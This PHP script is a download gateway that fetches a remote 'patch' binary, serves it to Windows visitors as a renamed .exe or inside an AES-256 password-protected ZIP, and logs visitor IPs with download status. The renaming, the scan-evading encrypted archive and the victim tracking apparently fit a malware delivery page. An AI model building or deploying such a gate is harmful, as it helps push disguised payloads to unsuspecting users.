<?php

// Load JSON settings file
$settingsFile = 'settings.json'; // Path to the settings file
$settingsFileStr = file_get_contents($settingsFile);
$settings = json_decode($settingsFileStr, false);


// Get values from the settings file
$archiving = $settings->Archiving->Enabled;
$correct_password = $settings->Archiving->Password; // Password for the ZIP file
$software_name = $settings->Archiving->SoftwareName; // Software Name
$zip_file = $settings->Archiving->ZIPName; // Name of the resulting ZIP file
$FileName = $settings->FileName; // Set filename when download

$AndroidLink = $settings->AndroidLink;
$iOSLink = $settings->iOSLink;
$MacOSLink = $settings->MacOSLink;

// PatchDownloadLinks
$patchURL = $settings->PatchDownloadLinks[0];

// get user's ip address
$userIP = $_SERVER['REMOTE_ADDR'];
$userOS = getOS();

// Function to get user's OS
function getOS() {
    $userAgent = $_SERVER['HTTP_USER_AGENT'];
    if (preg_match('/Windows/i', $userAgent)) return 'Windows';
    if (preg_match('/Macintosh|Mac OS X/i', $userAgent)) return 'macOS';
    if (preg_match('/Android/i', $userAgent)) return 'Android';
    if (preg_match('/iPhone|iPad/i', $userAgent)) return 'iPhone';
    return 'Unknown OS';
}

// Handle download request
if ($_SERVER['REQUEST_METHOD'] == 'GET') {

    // if archiving => OFF, users will redirect the patchDownloadLinks
    if ($archiving == "OFF") {
        
        switch($userOS) {
            case "Windows":

                if ($FileName) $FileName = $FileName.'.exe';
                else $FileName = basename($patchURL);
                
                $fileContent = file_put_contents($FileName, fopen($patchURL, 'r'));
                if ($fileContent === FALSE) {
                    die("Failed to download file from URL: $patchURL");
                }

                header('Content-Description: File Transfer');
                header('Content-Type: application/octet-stream');
                header('Content-Disposition: attachment; filename="'.$FileName.'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($FileName));
                readfile($FileName);
                unlink($FileName);

                break;
            case "Android":
                header("Location: $AndroidLink");
                break;
            case "iPhone":
                header("Location: $iOSLink");
                break;
            case "macOS":
                header("Location: $MacOSLink");
                break;
        }

        // Log the visitor and download count
        modifyDownloadStatus($userIP);
        // download count
        incrementDownloadCount();

        exit;
        
    }

    // if archiving => ON, users will download .zip file
    if ($archiving == "ON") {
 
        if ($userOS != 'Windows') exit;
 
        // Step 1: Download the file
        $fileContent = @file_get_contents($patchURL);
        $originName = basename($patchURL);

        if ($fileContent === FALSE) {
            die("Failed to download file from URL: $patchURL");
        }

        if (!$software_name) $software_name = $originName;
        else $software_name = $software_name.'.exe';
        if (!$zip_file) $zip_file = $originName.'.zip';
        else $zip_file = $zip_file.'.zip';
        

        // Step 2: Save the downloaded file with a new name
        if ($software_name && file_put_contents($software_name, $fileContent) === FALSE) {
            die("Failed to save the downloaded file.");
        } else if (!$software_name && $fileContent === FALSE) {
            die("Failed to save the downloaded file.");
        }


        // Step 3: Create a ZIP file and add the downloaded file to it
        $zip = new ZipArchive();
        if ($zip->open($zip_file, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) {

            if ($correct_password) $zip->setPassword($correct_password);

            if (!$zip->addFile($software_name)) {
                die("Failed to add file to ZIP archive.");
            }
    
            // Encrypt the file using AES-256 encryption
            if ($correct_password && !$zip->setEncryptionName($software_name, ZipArchive::EM_AES_256)) {
                die("Failed to encrypt file in the ZIP archive.");
            }
            
            $zip->close();
            echo "File has been zipped successfully as $zip_file.";

            if (file_exists($zip_file)) {
                header('Content-Description: File Transfer');
                header('Content-Type: application/zip');
                header('Content-Disposition: attachment; filename="'.basename($zip_file).'"');
                header('Expires: 0');
                header('Cache-Control: must-revalidate');
                header('Pragma: public');
                header('Content-Length: ' . filesize($zip_file));
                readfile($zip_file);

                // Log the visitor and download count
                modifyDownloadStatus($userIP);
                // download count
                incrementDownloadCount();

                unlink($zip_file);
            }
            unlink($software_name);

        } else {
            die("Failed to create ZIP file.");
        }

    }
    
} else {
    echo 'Invalid request.';
}


// Function to track download count
function incrementDownloadCount() {
    $downloadFile = 'download_count.txt';

    // Increment download count
    if (file_exists($downloadFile)) {
        $count = (int)file_get_contents($downloadFile);
        $count++;
    } else {
        $count = 1;
    }
    file_put_contents($downloadFile, $count);
}


// Function to modify the Doanload = success in csv file
function modifyDownloadStatus($userIP) {
    $csvFile = 'visitors.csv';
    $rows = [];

    // Open the CSV file and read its contents
    if (file_exists($csvFile)) {
        $file = fopen($csvFile, 'r');
        
        // Read each row and store in an array
        while (($data = fgetcsv($file)) !== FALSE) {
            // Check if the IP matches the target IP
            if ($data[0] === $userIP && $data[6] === "Visitor") {
                // Change "Visitor" to "Downloaded"
                $data[6] = "Downloaded";
            }
            $rows[] = $data; // Store updated row
        }
        fclose($file);
    }

    // Write the updated rows back to the CSV file
    $file = fopen($csvFile, 'w');
    foreach ($rows as $row) {
        fputcsv($file, $row);
    }
    fclose($file);
}



?>
